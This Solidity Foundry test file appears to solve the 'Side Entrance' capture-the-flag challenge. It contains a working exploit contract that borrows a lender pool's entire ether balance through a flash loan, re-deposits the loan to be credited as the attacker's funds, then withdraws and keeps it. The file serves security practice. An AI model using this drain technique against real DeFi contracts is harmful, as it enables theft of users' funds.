// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal pool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;
    AttackExecutor attackExecutor;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        pool = new SideEntranceLenderPool();
        vm.label(address(pool), "Side-Entrance-Lender-Pool");

        vm.deal(address(pool), ETHER_IN_POOL);

        assertEq(address(pool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;
        console.log(attackerInitialEthBalance);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // prank attacker
        vm.startPrank(attacker);
        // create contract
        attackExecutor = new AttackExecutor(pool);
        // call borrow func
        attackExecutor.borrow();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(
            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
        );
    }

    function validation() internal {
        assertEq(address(pool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract AttackExecutor is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool public pool;
    address public owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function execute() external payable {
        require(msg.sender == address(pool), "only pool");
        pool.deposit{value: msg.value}();
    }

    function borrow() public {
        require(msg.sender == owner, "not owner");
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        payable(owner).sendValue(address(this).balance);
    }

    receive() external payable {}
}
